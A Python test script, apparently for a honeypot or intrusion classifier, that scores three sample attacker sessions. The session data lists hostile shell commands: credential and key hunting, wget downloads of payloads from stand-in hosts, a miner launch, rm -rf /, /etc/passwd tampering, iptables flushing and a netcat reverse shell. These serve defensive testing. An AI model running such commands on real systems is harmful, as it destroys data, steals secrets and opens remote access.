import sys
sys.path.insert(0, '/app')
from modules.classifier import classify

tests = [
    ("APT Attacker", {
        "commands": ["whoami","id","uname -a","ifconfig","netstat -tulpn",
                     "cat /etc/passwd","find / -name *.pem 2>/dev/null",
                     "grep -r password /etc 2>/dev/null"],
        "timings": [5.2, 8.1, 12.3, 4.5, 9.2, 7.8, 15.4, 6.3]
    }),
    ("Bot Attacker", {
        "commands": ["wget http://malware.site/bot.sh","chmod +x /tmp/p","/tmp/p",
                     "wget http://c2.evil.net/payload","chmod 777 /tmp/p",
                     "/tmp/miner -o pool.com:443"],
        "timings": [0.1, 0.08, 0.05, 0.12, 0.07, 0.04]
    }),
    ("Script Kiddie", {
        "commands": ["rm -rf /","chmod 777 /etc/passwd",
                     "echo hacker >> /etc/passwd","iptables -F",
                     "bash -c 'nc -e /bin/bash attacker 4444'"],
        "timings": [0.5, 0.3, 0.8, 0.4, 0.6]
    }),
]

for label, session in tests:
    r = classify(session)
    print(f"[{label}] Predicted={r['type']} Confidence={r['confidence']:.0%} Source={r['source']}")
    print(f"  Reasoning: {r['reasoning']}")
    print()
